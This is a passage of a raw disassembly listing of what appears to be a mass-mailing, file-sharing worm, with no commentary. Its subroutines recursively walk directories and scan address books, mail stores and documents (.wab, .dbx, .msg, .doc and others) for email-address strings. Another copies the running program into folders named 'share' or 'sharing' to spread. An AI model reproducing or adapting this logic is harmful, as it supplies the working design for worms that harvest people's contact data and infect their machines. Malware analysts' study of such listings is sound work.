.text:004028E3		       inc     eax
.text:004028E4		       cmp     eax, 0FFFh
.text:004028E9		       jl      short loc_4028C0
.text:004028EB		       and     [ebp+ecx+Source], 0
.text:004028F3		       lea     eax, [ebp+Source]
.text:004028F9		       push    eax	       ; Source
.text:004028FA		       push    esi	       ; Dest
.text:004028FB		       call    _strcpy
.text:00402900		       pop     ecx
.text:00402901		       pop     ecx
.text:00402902		       pop     esi
.text:00402903		       leave
.text:00402904		       retn
.text:00402904 sub_402898      endp
.text:00402904
.text:00402905
.text:00402905 ; =============== S U B R O U T I N E =======================================
.text:00402905
.text:00402905 ; Attributes: bp-based frame
.text:00402905
.text:00402905 ; int __cdecl sub_402905(char *SubStr)
.text:00402905 sub_402905      proc near	       ; CODE XREF: sub_4029A9+15Bp
.text:00402905
.text:00402905 dwFlags	       = dword ptr -4
.text:00402905 SubStr	       = dword ptr  8
.text:00402905
.text:00402905		       push    ebp
.text:00402906		       mov     ebp, esp
.text:00402908		       push    ecx
.text:00402909		       mov     eax, dword_414B68
.text:0040290E		       push    esi
.text:0040290F		       cmp     eax, 27FFh
.text:00402914		       push    edi
.text:00402915		       jg      loc_4029A5
.text:0040291B		       xor     esi, esi
.text:0040291D		       test    eax, eax
.text:0040291F		       jle     short loc_402942
.text:00402921		       mov     edi, offset hFile
.text:00402926
.text:00402926 loc_402926:			       ; CODE XREF: sub_402905+3Bj
.text:00402926		       push    [ebp+SubStr]    ; SubStr
.text:00402929		       push    dword ptr [edi] ; Str
.text:0040292B		       call    _strstr
.text:00402930		       pop     ecx
.text:00402931		       test    eax, eax
.text:00402933		       pop     ecx
.text:00402934		       jnz     short loc_4029A5
.text:00402936		       inc     esi
.text:00402937		       add     edi, 4
.text:0040293A		       cmp     esi, dword_414B68
.text:00402940		       jl      short loc_402926
.text:00402942
.text:00402942 loc_402942:			       ; CODE XREF: sub_402905+1Aj
.text:00402942		       push    [ebp+SubStr]    ; Str
.text:00402945		       call    _strlen
.text:0040294A		       push    eax	       ; unsigned int
.text:0040294B		       call    ??2@YAPAXI@Z    ; operator new(uint)
.text:00402950		       push    [ebp+SubStr]    ; Source
.text:00402953		       mov     ecx, dword_414B68
.text:00402959		       push    eax	       ; Dest
.text:0040295A		       mov     hFile[ecx*4], eax
.text:00402961		       call    _strcpy
.text:00402966		       and     [ebp+dwFlags], 0
.text:0040296A		       add     esp, 10h
.text:0040296D		       lea     eax, [ebp+dwFlags]
.text:00402970		       push    0	       ; dwReserved
.text:00402972		       push    eax	       ; lpdwFlags
.text:00402973		       call    ds:InternetGetConnectedState
.text:00402979		       test    eax, eax
.text:0040297B		       jz      short loc_40299F
.text:0040297D		       mov     eax, dword_414B68
.text:00402982		       push    hFile[eax*4]    ; hFile
.text:00402989		       call    sub_401D65
.text:0040298E		       test    eax, eax
.text:00402990		       pop     ecx
.text:00402991		       jz      short loc_40299F
.text:00402993		       mov     eax, dword_414B68
.text:00402998		       mov     byte_408260[eax], 1
.text:0040299F
.text:0040299F loc_40299F:			       ; CODE XREF: sub_402905+76j
.text:0040299F					       ; sub_402905+8Cj
.text:0040299F		       inc     dword_414B68
.text:004029A5
.text:004029A5 loc_4029A5:			       ; CODE XREF: sub_402905+10j
.text:004029A5					       ; sub_402905+2Fj
.text:004029A5		       pop     edi
.text:004029A6		       pop     esi
.text:004029A7		       leave
.text:004029A8		       retn
.text:004029A8 sub_402905      endp
.text:004029A8
.text:004029A9
.text:004029A9 ; =============== S U B R O U T I N E =======================================
.text:004029A9
.text:004029A9 ; Attributes: bp-based frame
.text:004029A9
.text:004029A9 ; int __cdecl sub_4029A9(char *Str)
.text:004029A9 sub_4029A9      proc near	       ; CODE XREF: sub_402B56+166p
.text:004029A9					       ; sub_402B56+181p ...
.text:004029A9
.text:004029A9 var_38	       = byte ptr -38h
.text:004029A9 var_37	       = byte ptr -37h
.text:004029A9 var_36	       = byte ptr -36h
.text:004029A9 var_35	       = byte ptr -35h
.text:004029A9 SubStr	       = byte ptr -34h
.text:004029A9 var_32	       = byte ptr -32h
.text:004029A9 var_C	       = dword ptr -0Ch
.text:004029A9 var_8	       = dword ptr -8
.text:004029A9 var_1	       = byte ptr -1
.text:004029A9 Str	       = dword ptr  8
.text:004029A9
.text:004029A9		       push    ebp
.text:004029AA		       mov     ebp, esp
.text:004029AC		       sub     esp, 34h
.text:004029AF		       push    ebx
.text:004029B0		       push    esi
.text:004029B1		       push    edi
.text:004029B2		       mov     edi, [ebp+Str]
.text:004029B5		       push    edi	       ; Str
.text:004029B6		       call    _strlen
.text:004029BB		       xor     ebx, ebx
.text:004029BD		       xor     esi, esi
.text:004029BF		       cmp     eax, ebx
.text:004029C1		       pop     ecx
.text:004029C2		       mov     [ebp+var_C], eax
.text:004029C5		       mov     [ebp+var_8], ebx
.text:004029C8		       jz      loc_402B1E
.text:004029CE		       and     [ebp+var_1], 0
.text:004029D2
.text:004029D2 loc_4029D2:			       ; CODE XREF: sub_4029A9:loc_402B18j
.text:004029D2		       mov     eax, [ebp+var_8]
.text:004029D5		       cmp     eax, [ebp+var_C]
.text:004029D8		       jge     loc_402B1E
.text:004029DE		       cmp     ds:byte_406578[esi], 0
.text:004029E5		       jz      short loc_402A03
.text:004029E7		       mov     ecx, off_4070F4[esi*4]
.text:004029EE		       mov     dl, [eax+edi]
.text:004029F1		       cmp     dl, [ecx]
.text:004029F3		       jnz     short loc_4029F9
.text:004029F5		       inc     ebx
.text:004029F6		       inc     esi
.text:004029F7		       jmp     short loc_4029FD
.text:004029F9 ; ---------------------------------------------------------------------------
.text:004029F9
.text:004029F9 loc_4029F9:			       ; CODE XREF: sub_4029A9+4Aj
.text:004029F9		       xor     esi, esi
.text:004029FB		       xor     ebx, ebx
.text:004029FD
.text:004029FD loc_4029FD:			       ; CODE XREF: sub_4029A9+4Ej
.text:004029FD		       inc     eax
.text:004029FE		       mov     [ebp+var_8], eax
.text:00402A01		       jmp     short loc_402A4E
.text:00402A03 ; ---------------------------------------------------------------------------
.text:00402A03
.text:00402A03 loc_402A03:			       ; CODE XREF: sub_4029A9+3Cj
.text:00402A03		       movsx   eax, byte ptr [eax+edi]
.text:00402A07		       push    eax	       ; Val
.text:00402A08		       push    off_4070F4[esi*4] ; Str
.text:00402A0F		       call    _strchr
.text:00402A14		       pop     ecx
.text:00402A15		       test    eax, eax
.text:00402A17		       pop     ecx
.text:00402A18		       jnz     short loc_402A46
.text:00402A1A		       mov     eax, [ebp+var_8]
.text:00402A1D		       mov     al, [eax+edi]
.text:00402A20		       cmp     al, 60h
.text:00402A22		       jle     short loc_402A28
.text:00402A24		       cmp     al, 7Bh
.text:00402A26		       jl      short loc_402A46
.text:00402A28
.text:00402A28 loc_402A28:			       ; CODE XREF: sub_4029A9+79j
.text:00402A28		       cmp     al, 2Fh
.text:00402A2A		       jle     short loc_402A30
.text:00402A2C		       cmp     al, 3Ah
.text:00402A2E		       jl      short loc_402A46
.text:00402A30
.text:00402A30 loc_402A30:			       ; CODE XREF: sub_4029A9+81j
.text:00402A30		       cmp     [ebp+var_1], 1
.text:00402A34		       jnz     short loc_402A39
.text:00402A36		       inc     esi
.text:00402A37		       jmp     short loc_402A40
.text:00402A39 ; ---------------------------------------------------------------------------
.text:00402A39
.text:00402A39 loc_402A39:			       ; CODE XREF: sub_4029A9+8Bj
.text:00402A39		       inc     [ebp+var_8]
.text:00402A3C		       xor     esi, esi
.text:00402A3E		       xor     ebx, ebx
.text:00402A40
.text:00402A40 loc_402A40:			       ; CODE XREF: sub_4029A9+8Ej
.text:00402A40		       and     [ebp+var_1], 0
.text:00402A44		       jmp     short loc_402A4E
.text:00402A46 ; ---------------------------------------------------------------------------
.text:00402A46
.text:00402A46 loc_402A46:			       ; CODE XREF: sub_4029A9+6Fj
.text:00402A46					       ; sub_4029A9+7Dj ...
.text:00402A46		       inc     [ebp+var_8]
.text:00402A49		       mov     [ebp+var_1], 1
.text:00402A4D		       inc     ebx
.text:00402A4E
.text:00402A4E loc_402A4E:			       ; CODE XREF: sub_4029A9+58j
.text:00402A4E					       ; sub_4029A9+9Bj
.text:00402A4E		       cmp     ebx, 28h
.text:00402A51		       jle     short loc_402A5B
.text:00402A53		       and     [ebp+var_1], 0
.text:00402A57		       xor     esi, esi
.text:00402A59		       xor     ebx, ebx
.text:00402A5B
.text:00402A5B loc_402A5B:			       ; CODE XREF: sub_4029A9+A8j
.text:00402A5B		       cmp     esi, 3
.text:00402A5E		       jnz     loc_402B18
.text:00402A64		       mov     ax, word_414B6C
.text:00402A6A		       push    9
.text:00402A6C		       mov     word ptr	[ebp+SubStr], ax
.text:00402A70		       pop     ecx
.text:00402A71		       xor     eax, eax
.text:00402A73		       lea     edi, [ebp+var_32]
.text:00402A76		       rep stosd
.text:00402A78		       stosw
.text:00402A7A		       mov     eax, [ebp+var_8]
.text:00402A7D		       push    ebx	       ; Count
.text:00402A7E		       sub     eax, ebx
.text:00402A80		       add     eax, [ebp+Str]
.text:00402A83		       push    eax	       ; Source
.text:00402A84		       lea     eax, [ebp+SubStr]
.text:00402A87		       push    eax	       ; Dest
.text:00402A88		       call    _strncpy
.text:00402A8D		       lea     eax, [ebp+SubStr]
.text:00402A90		       push    eax	       ; Str
.text:00402A91		       call    _strlen
.text:00402A96		       add     esp, 10h
.text:00402A99		       cmp     eax, 5
.text:00402A9C		       jbe     short loc_402B0A
.text:00402A9E		       lea     eax, [ebp+SubStr]
.text:00402AA1		       push    eax	       ; Str
.text:00402AA2		       call    _strlen
.text:00402AA7		       mov     esi, eax
.text:00402AA9		       pop     ecx
.text:00402AAA		       cmp     [ebp+esi+var_35], 5Dh
.text:00402AAF		       lea     edi, [ebp+esi+var_35]
.text:00402AB3		       jnz     short loc_402ACA
.text:00402AB5		       push    5Bh	       ; Val
.text:00402AB7		       push    off_407100      ; Str
.text:00402ABD		       call    _strchr
.text:00402AC2		       pop     ecx
.text:00402AC3		       test    eax, eax
.text:00402AC5		       pop     ecx
.text:00402AC6		       jnz     short loc_402ACA
.text:00402AC8		       and     [edi], al
.text:00402ACA
.text:00402ACA loc_402ACA:			       ; CODE XREF: sub_4029A9+10Aj
.text:00402ACA					       ; sub_4029A9+11Dj
.text:00402ACA		       movsx   eax, byte ptr [edi]
.text:00402ACD		       push    eax	       ; C
.text:00402ACE		       call    _isdigit
.text:00402AD3		       test    eax, eax
.text:00402AD5		       pop     ecx
.text:00402AD6		       jz      short loc_402AE6
.text:00402AD8		       cmp     [ebp+esi+var_37], 2Eh
.text:00402ADD		       jz      short loc_402B00
.text:00402ADF		       cmp     [ebp+esi+var_38], 2Eh
.text:00402AE4		       jz      short loc_402B00
.text:00402AE6
.text:00402AE6 loc_402AE6:			       ; CODE XREF: sub_4029A9+12Dj
.text:00402AE6		       cmp     [ebp+esi+var_36], 2Eh
.text:00402AEB		       jz      short loc_402B00
.text:00402AED		       cmp     byte ptr	[edi], 5Dh
.text:00402AF0		       jz      short loc_402B00
.text:00402AF2		       cmp     [ebp+esi+var_37], 2Eh
.text:00402AF7		       jz      short loc_402B00
.text:00402AF9		       cmp     [ebp+esi+var_38], 2Eh
.text:00402AFE		       jnz     short loc_402B0A
.text:00402B00
.text:00402B00 loc_402B00:			       ; CODE XREF: sub_4029A9+134j
.text:00402B00					       ; sub_4029A9+13Bj ...
.text:00402B00		       lea     eax, [ebp+SubStr]
.text:00402B03		       push    eax	       ; SubStr
.text:00402B04		       call    sub_402905
.text:00402B09		       pop     ecx
.text:00402B0A
.text:00402B0A loc_402B0A:			       ; CODE XREF: sub_4029A9+F3j
.text:00402B0A					       ; sub_4029A9+155j
.text:00402B0A		       and     [ebp+var_1], 0
.text:00402B0E		       mov     edi, [ebp+Str]
.text:00402B11		       xor     esi, esi
.text:00402B13		       xor     ebx, ebx
.text:00402B15		       cmp     esi, 3
.text:00402B18
.text:00402B18 loc_402B18:			       ; CODE XREF: sub_4029A9+B5j
.text:00402B18		       jl      loc_4029D2
.text:00402B1E
.text:00402B1E loc_402B1E:			       ; CODE XREF: sub_4029A9+1Fj
.text:00402B1E					       ; sub_4029A9+2Fj
.text:00402B1E		       pop     edi
.text:00402B1F		       pop     esi
.text:00402B20		       xor     eax, eax
.text:00402B22		       pop     ebx
.text:00402B23		       leave
.text:00402B24		       retn
.text:00402B24 sub_4029A9      endp
.text:00402B24
.text:00402B25
.text:00402B25 ; =============== S U B R O U T I N E =======================================
.text:00402B25
.text:00402B25
.text:00402B25 ; int __cdecl sub_402B25(char *Str)
.text:00402B25 sub_402B25      proc near	       ; CODE XREF: sub_402B56+13p
.text:00402B25
.text:00402B25 Str	       = dword ptr  4
.text:00402B25
.text:00402B25		       push    esi
.text:00402B26		       push    edi
.text:00402B27		       mov     edi, [esp+8+Str]
.text:00402B2B		       push    edi	       ; Str
.text:00402B2C		       call    _strlen
.text:00402B31		       pop     ecx
.text:00402B32		       mov     esi, eax
.text:00402B34
.text:00402B34 loc_402B34:			       ; CODE XREF: sub_402B25+19j
.text:00402B34					       ; sub_402B25+25j
.text:00402B34		       dec     esi
.text:00402B35		       cmp     esi, 0FFFFFFFFh
.text:00402B38		       jle     short loc_402B51
.text:00402B3A		       cmp     byte ptr	[esi+edi], 2Eh
.text:00402B3E		       jnz     short loc_402B34
.text:00402B40		       push    edi	       ; Str
.text:00402B41		       call    _strlen
.text:00402B46		       dec     eax
.text:00402B47		       pop     ecx
.text:00402B48		       cmp     esi, eax
.text:00402B4A		       jz      short loc_402B34
.text:00402B4C		       lea     eax, [esi+edi]
.text:00402B4F		       jmp     short loc_402B53
.text:00402B51 ; ---------------------------------------------------------------------------
.text:00402B51
.text:00402B51 loc_402B51:			       ; CODE XREF: sub_402B25+13j
.text:00402B51		       xor     eax, eax
.text:00402B53
.text:00402B53 loc_402B53:			       ; CODE XREF: sub_402B25+2Aj
.text:00402B53		       pop     edi
.text:00402B54		       pop     esi
.text:00402B55		       retn
.text:00402B55 sub_402B25      endp
.text:00402B55
.text:00402B56
.text:00402B56 ; =============== S U B R O U T I N E =======================================
.text:00402B56
.text:00402B56 ; Attributes: bp-based frame
.text:00402B56
.text:00402B56 ; int __cdecl sub_402B56(LPCSTR hFile)
.text:00402B56 sub_402B56      proc near	       ; CODE XREF: sub_402DDA+124p
.text:00402B56
.text:00402B56 var_101C	       = dword ptr -101Ch
.text:00402B56 Buffer	       = byte ptr -100Ch
.text:00402B56 lOffset	       = dword ptr -8
.text:00402B56 Str1	       = dword ptr -4
.text:00402B56 hFile	       = dword ptr  8
.text:00402B56
.text:00402B56		       push    ebp
.text:00402B57		       mov     ebp, esp
.text:00402B59		       mov     eax, 100Ch
.text:00402B5E		       call    __alloca_probe
.text:00402B63		       push    ebx
.text:00402B64		       push    esi
.text:00402B65		       push    edi
.text:00402B66		       push    [ebp+hFile]     ; Str
.text:00402B69		       call    sub_402B25
.text:00402B6E		       mov     ebx, eax
.text:00402B70		       xor     esi, esi
.text:00402B72		       cmp     ebx, esi
.text:00402B74		       pop     ecx
.text:00402B75		       mov     [ebp+Str1], ebx
.text:00402B78		       jz      loc_402D43
.text:00402B7E		       push    ebx	       ; String
.text:00402B7F		       call    __strlwr
.text:00402B84		       pop     ecx
.text:00402B85		       mov     [ebp+lOffset], esi
.text:00402B88		       mov     edi, 0FFh
.text:00402B8D
.text:00402B8D loc_402B8D:			       ; CODE XREF: sub_402B56+50j
.text:00402B8D		       push    ebx	       ; SubStr
.text:00402B8E		       push    off_407100[esi*4] ; Str
.text:00402B95		       call    _strstr
.text:00402B9A		       pop     ecx
.text:00402B9B		       test    eax, eax
.text:00402B9D		       pop     ecx
.text:00402B9E		       jz      short loc_402BA2
.text:00402BA0		       mov     esi, edi
.text:00402BA2
.text:00402BA2 loc_402BA2:			       ; CODE XREF: sub_402B56+48j
.text:00402BA2		       inc     esi
.text:00402BA3		       cmp     esi, 12h
.text:00402BA6		       jl      short loc_402B8D
.text:00402BA8		       cmp     esi, edi
.text:00402BAA		       jl      loc_402D43
.text:00402BB0		       push    0	       ; iReadWrite
.text:00402BB2		       push    [ebp+hFile]     ; lpPathName
.text:00402BB5		       call    ds:_lopen
.text:00402BBB		       cmp     eax, 0FFFFFFFFh
.text:00402BBE		       mov     [ebp+hFile], eax
.text:00402BC1		       jz      loc_402D43
.text:00402BC7		       mov     ebx, offset word_414B6C
.text:00402BCC		       lea     eax, [ebp+Buffer]
.text:00402BD2		       push    ebx	       ; Source
.text:00402BD3		       push    eax	       ; Dest
.text:00402BD4		       call    _strcpy
.text:00402BD9		       mov     esi, ds:_lread
.text:00402BDF		       pop     ecx
.text:00402BE0		       pop     ecx
.text:00402BE1		       mov     edi, 1000h
.text:00402BE6		       lea     eax, [ebp+Buffer]
.text:00402BEC		       push    edi	       ; uBytes
.text:00402BED		       push    eax	       ; lpBuffer
.text:00402BEE		       push    [ebp+hFile]     ; hFile
.text:00402BF1
.text:00402BF1 loc_402BF1:			       ; CODE XREF: sub_402B56+1DFj
.text:00402BF1		       call    esi ; _lread
.text:00402BF3		       and     [ebp+eax+Buffer], 0
.text:00402BFB		       test    eax, eax
.text:00402BFD		       jle     loc_402D3A
.text:00402C03		       lea     eax, [ebp+Buffer]
.text:00402C09		       push    eax	       ; String
.text:00402C0A		       call    __strlwr
.text:00402C0F		       mov     [esp+101Ch+var_101C], offset a_sht ; ".sht"
.text:00402C16		       push    [ebp+Str1]      ; Str1
.text:00402C19		       call    _strcmp
.text:00402C1E		       pop     ecx
.text:00402C1F		       test    eax, eax
.text:00402C21		       pop     ecx
.text:00402C22		       jz      loc_402CDF
.text:00402C28		       push    offset Str2     ; ".tbb"
.text:00402C2D		       push    [ebp+Str1]      ; Str1
.text:00402C30		       call    _strcmp
.text:00402C35		       pop     ecx
.text:00402C36		       test    eax, eax
.text:00402C38		       pop     ecx
.text:00402C39		       jz      loc_402CDF
.text:00402C3F		       push    offset a_adb    ; ".adb"
.text:00402C44		       push    [ebp+Str1]      ; Str1
.text:00402C47		       call    _strcmp
.text:00402C4C		       pop     ecx
.text:00402C4D		       test    eax, eax
.text:00402C4F		       pop     ecx
.text:00402C50		       jz      loc_402CDF
.text:00402C56		       push    offset a_wab    ; ".wab"
.text:00402C5B		       push    [ebp+Str1]      ; Str1
.text:00402C5E		       call    _strcmp
.text:00402C63		       pop     ecx
.text:00402C64		       test    eax, eax
.text:00402C66		       pop     ecx
.text:00402C67		       jz      short loc_402CDF
.text:00402C69		       push    offset a_msg    ; ".msg"
.text:00402C6E		       push    [ebp+Str1]      ; Str1
.text:00402C71		       call    _strcmp
.text:00402C76		       pop     ecx
.text:00402C77		       test    eax, eax
.text:00402C79		       pop     ecx
.text:00402C7A		       jz      short loc_402CC4
.text:00402C7C		       push    offset a_oft    ; ".oft"
.text:00402C81		       push    [ebp+Str1]      ; Str1
.text:00402C84		       call    _strcmp
.text:00402C89		       pop     ecx
.text:00402C8A		       test    eax, eax
.text:00402C8C		       pop     ecx
.text:00402C8D		       jz      short loc_402CC4
.text:00402C8F		       push    offset a_doc    ; ".doc"
.text:00402C94		       push    [ebp+Str1]      ; Str1
.text:00402C97		       call    _strcmp
.text:00402C9C		       pop     ecx
.text:00402C9D		       test    eax, eax
.text:00402C9F		       pop     ecx
.text:00402CA0		       jz      short loc_402CC4
.text:00402CA2		       push    offset a_dbx    ; ".dbx"
.text:00402CA7		       push    [ebp+Str1]      ; Str1
.text:00402CAA		       call    _strcmp
.text:00402CAF		       pop     ecx
.text:00402CB0		       test    eax, eax
.text:00402CB2		       pop     ecx
.text:00402CB3		       jz      short loc_402CC4
.text:00402CB5		       lea     eax, [ebp+Buffer]
.text:00402CBB		       push    eax	       ; Str
.text:00402CBC		       call    sub_4029A9
.text:00402CC1
.text:00402CC1 loc_402CC1:			       ; CODE XREF: sub_402B56+187j
.text:00402CC1		       pop     ecx
.text:00402CC2		       jmp     short loc_402D06
.text:00402CC4 ; ---------------------------------------------------------------------------
.text:00402CC4
.text:00402CC4 loc_402CC4:			       ; CODE XREF: sub_402B56+124j
.text:00402CC4					       ; sub_402B56+137j ...
.text:00402CC4		       lea     eax, [ebp+Buffer]
.text:00402CCA		       push    eax
.text:00402CCB		       call    sub_402872
.text:00402CD0		       lea     eax, [ebp+Buffer]
.text:00402CD6		       push    eax	       ; Str
.text:00402CD7		       call    sub_4029A9
.text:00402CDC		       pop     ecx
.text:00402CDD		       jmp     short loc_402CC1
.text:00402CDF ; ---------------------------------------------------------------------------
.text:00402CDF
.text:00402CDF loc_402CDF:			       ; CODE XREF: sub_402B56+CCj
.text:00402CDF					       ; sub_402B56+E3j ...
.text:00402CDF		       lea     eax, [ebp+Buffer]
.text:00402CE5		       push    eax
.text:00402CE6		       call    sub_402872
.text:00402CEB		       lea     eax, [ebp+Buffer]
.text:00402CF1		       push    eax
.text:00402CF2		       call    sub_402898
.text:00402CF7		       lea     eax, [ebp+Buffer]
.text:00402CFD		       push    eax	       ; Str
.text:00402CFE		       call    sub_4029A9
.text:00402D03		       add     esp, 0Ch
.text:00402D06
.text:00402D06 loc_402D06:			       ; CODE XREF: sub_402B56+16Cj
.text:00402D06		       push    0	       ; iOrigin
.text:00402D08		       push    [ebp+lOffset]   ; lOffset
.text:00402D0B		       push    [ebp+hFile]     ; hFile
.text:00402D0E		       call    ds:_llseek
.text:00402D14		       add     [ebp+lOffset], 800h
.text:00402D1B		       lea     eax, [ebp+Buffer]
.text:00402D21		       push    ebx	       ; Source
.text:00402D22		       push    eax	       ; Dest
.text:00402D23		       call    _strcpy
.text:00402D28		       pop     ecx
.text:00402D29		       lea     eax, [ebp+Buffer]
.text:00402D2F		       pop     ecx
.text:00402D30		       push    edi
.text:00402D31		       push    eax
.text:00402D32		       push    [ebp+hFile]
.text:00402D35		       jmp     loc_402BF1
.text:00402D3A ; ---------------------------------------------------------------------------
.text:00402D3A
.text:00402D3A loc_402D3A:			       ; CODE XREF: sub_402B56+A7j
.text:00402D3A		       push    [ebp+hFile]     ; hFile
.text:00402D3D		       call    ds:_lclose
.text:00402D43
.text:00402D43 loc_402D43:			       ; CODE XREF: sub_402B56+22j
.text:00402D43					       ; sub_402B56+54j ...
.text:00402D43		       pop     edi
.text:00402D44		       pop     esi
.text:00402D45		       pop     ebx
.text:00402D46		       leave
.text:00402D47		       retn
.text:00402D47 sub_402B56      endp
.text:00402D47
.text:00402D48
.text:00402D48 ; =============== S U B R O U T I N E =======================================
.text:00402D48
.text:00402D48 ; Attributes: bp-based frame
.text:00402D48
.text:00402D48 ; int __cdecl sub_402D48(char *Source)
.text:00402D48 sub_402D48      proc near	       ; CODE XREF: sub_402DDA+109p
.text:00402D48
.text:00402D48 ExistingFileName= byte ptr -800h
.text:00402D48 var_401	       = byte ptr -401h
.text:00402D48 Dest	       = byte ptr -400h
.text:00402D48 Source	       = dword ptr  8
.text:00402D48
.text:00402D48		       push    ebp
.text:00402D49		       mov     ebp, esp
.text:00402D4B		       sub     esp, 800h
.text:00402D51		       push    esi
.text:00402D52		       lea     eax, [ebp+ExistingFileName]
.text:00402D58		       push    400h	       ; nSize
.text:00402D5D		       push    eax	       ; lpFilename
.text:00402D5E		       push    0	       ; hModule
.text:00402D60		       call    ds:GetModuleFileNameA
.text:00402D66		       mov     esi, offset off_407034
.text:00402D6B
.text:00402D6B loc_402D6B:			       ; CODE XREF: sub_402D48+8Dj
.text:00402D6B		       push    [ebp+Source]    ; Source
.text:00402D6E		       lea     eax, [ebp+Dest]
.text:00402D74		       push    eax	       ; Dest
.text:00402D75		       call    _strcpy
.text:00402D7A		       lea     eax, [ebp+Dest]
.text:00402D80		       push    eax	       ; Str
.text:00402D81		       call    _strlen
.text:00402D86		       add     esp, 0Ch
.text:00402D89		       cmp     [ebp+eax+var_401], 5Ch
.text:00402D91		       jz      short loc_402DA6
.text:00402D93		       lea     eax, [ebp+Dest]
.text:00402D99		       push    offset Source   ; "\\"
.text:00402D9E		       push    eax	       ; Dest
.text:00402D9F		       call    _strcat
.text:00402DA4		       pop     ecx
.text:00402DA5		       pop     ecx
.text:00402DA6
.text:00402DA6 loc_402DA6:			       ; CODE XREF: sub_402D48+49j
.text:00402DA6		       push    dword ptr [esi] ; Source
.text:00402DA8		       lea     eax, [ebp+Dest]
.text:00402DAE		       push    eax	       ; Dest
.text:00402DAF		       call    _strcat
.text:00402DB4		       pop     ecx
.text:00402DB5		       lea     eax, [ebp+Dest]
.text:00402DBB		       pop     ecx
.text:00402DBC		       push    0	       ; bFailIfExists
.text:00402DBE		       push    eax	       ; lpNewFileName
.text:00402DBF		       lea     eax, [ebp+ExistingFileName]
.text:00402DC5		       push    eax	       ; lpExistingFileName
.text:00402DC6		       call    ds:CopyFileA
.text:00402DCC		       add     esi, 4
.text:00402DCF		       cmp     esi, offset off_407094
.text:00402DD5		       jl      short loc_402D6B
.text:00402DD7		       pop     esi
.text:00402DD8		       leave
.text:00402DD9		       retn
.text:00402DD9 sub_402D48      endp
.text:00402DD9
.text:00402DDA
.text:00402DDA ; =============== S U B R O U T I N E =======================================
.text:00402DDA
.text:00402DDA ; Attributes: bp-based frame
.text:00402DDA
.text:00402DDA ; int __cdecl sub_402DDA(char *Source)
.text:00402DDA sub_402DDA      proc near	       ; CODE XREF: sub_402DDA+116p
.text:00402DDA					       ; sub_402F30+15p
.text:00402DDA
.text:00402DDA Dest	       = byte ptr -540h
.text:00402DDA FindFileData    = _WIN32_FIND_DATAA ptr -140h
.text:00402DDA Source	       = dword ptr  8
.text:00402DDA
.text:00402DDA		       push    ebp
.text:00402DDB		       mov     ebp, esp
.text:00402DDD		       sub     esp, 540h
.text:00402DE3		       push    esi
.text:00402DE4		       lea     eax, [ebp+Dest]
.text:00402DEA		       push    [ebp+Source]    ; Source
.text:00402DED		       push    eax	       ; Dest
.text:00402DEE		       call    _strcpy
.text:00402DF3		       lea     eax, [ebp+Dest]
.text:00402DF9		       push    offset a__0     ; "\\*.*"
.text:00402DFE		       push    eax	       ; Dest
.text:00402DFF		       call    _strcat
.text:00402E04		       add     esp, 10h
.text:00402E07		       lea     eax, [ebp+FindFileData]
.text:00402E0D		       push    eax	       ; lpFindFileData
.text:00402E0E		       lea     eax, [ebp+Dest]
.text:00402E14		       push    eax	       ; lpFileName
.text:00402E15		       call    ds:FindFirstFileA
.text:00402E1B		       mov     esi, eax
.text:00402E1D		       test    esi, esi
.text:00402E1F		       jz      loc_402F2D
.text:00402E25		       cmp     esi, 0FFFFFFFFh
.text:00402E28		       jz      loc_402F2D
.text:00402E2E
.text:00402E2E loc_402E2E:			       ; CODE XREF: sub_402DDA+146j
.text:00402E2E		       cmp     [ebp+FindFileData.cFileName+1], 0
.text:00402E35		       jnz     short loc_402E44
.text:00402E37		       cmp     [ebp+FindFileData.cFileName], 2Eh
.text:00402E3E		       jz      loc_402F10
.text:00402E44
.text:00402E44 loc_402E44:			       ; CODE XREF: sub_402DDA+5Bj
.text:00402E44		       cmp     [ebp+FindFileData.cFileName+2], 0
.text:00402E4B		       jnz     short loc_402E63
.text:00402E4D		       cmp     [ebp+FindFileData.cFileName], 2Eh
.text:00402E54		       jnz     short loc_402E63
.text:00402E56		       cmp     [ebp+FindFileData.cFileName+1], 2Eh
.text:00402E5D		       jz      loc_402F10
.text:00402E63
.text:00402E63 loc_402E63:			       ; CODE XREF: sub_402DDA+71j
.text:00402E63					       ; sub_402DDA+7Aj
.text:00402E63		       push    [ebp+Source]    ; Source
.text:00402E66		       lea     eax, [ebp+Dest]
.text:00402E6C		       push    eax	       ; Dest
.text:00402E6D		       call    _strcpy
.text:00402E72		       lea     eax, [ebp+Dest]
.text:00402E78		       push    offset Source   ; "\\"
.text:00402E7D		       push    eax	       ; Dest
.text:00402E7E		       call    _strcat
.text:00402E83		       lea     eax, [ebp+FindFileData.cFileName]
.text:00402E89		       push    eax	       ; Source
.text:00402E8A		       lea     eax, [ebp+Dest]
.text:00402E90		       push    eax	       ; Dest
.text:00402E91		       call    _strcat
.text:00402E96		       lea     eax, [ebp+Dest]
.text:00402E9C		       push    eax	       ; String
.text:00402E9D		       call    __strlwr
.text:00402EA2		       add     esp, 1Ch
.text:00402EA5		       test    byte ptr	[ebp+FindFileData.dwFileAttributes], 10h
.text:00402EAC		       jz      short loc_402EF7
.text:00402EAE		       lea     eax, [ebp+Dest]
.text:00402EB4		       push    offset SubStr   ; "share"
.text:00402EB9		       push    eax	       ; Str
.text:00402EBA		       call    _strstr
.text:00402EBF		       pop     ecx
.text:00402EC0		       test    eax, eax
.text:00402EC2		       pop     ecx
.text:00402EC3		       jnz     short loc_402EDC
.text:00402EC5		       lea     eax, [ebp+Dest]
.text:00402ECB		       push    offset aSharing ; "sharing"
.text:00402ED0		       push    eax	       ; Str
.text:00402ED1		       call    _strstr
.text:00402ED6		       pop     ecx
.text:00402ED7		       test    eax, eax
.text:00402ED9		       pop     ecx
.text:00402EDA		       jz      short loc_402EE9
.text:00402EDC
.text:00402EDC loc_402EDC:			       ; CODE XREF: sub_402DDA+E9j
.text:00402EDC		       lea     eax, [ebp+Dest]
.text:00402EE2		       push    eax	       ; Source
.text:00402EE3		       call    sub_402D48
.text:00402EE8		       pop     ecx
.text:00402EE9
.text:00402EE9 loc_402EE9:			       ; CODE XREF: sub_402DDA+100j
.text:00402EE9		       lea     eax, [ebp+Dest]
.text:00402EEF		       push    eax	       ; Source
.text:00402EF0		       call    sub_402DDA
.text:00402EF5		       jmp     short loc_402F03
.text:00402EF7 ; ---------------------------------------------------------------------------
.text:00402EF7
.text:00402EF7 loc_402EF7:			       ; CODE XREF: sub_402DDA+D2j
.text:00402EF7		       lea     eax, [ebp+Dest]
.text:00402EFD		       push    eax	       ; hFile
.text:00402EFE		       call    sub_402B56
.text:00402F03
.text:00402F03 loc_402F03:			       ; CODE XREF: sub_402DDA+11Bj
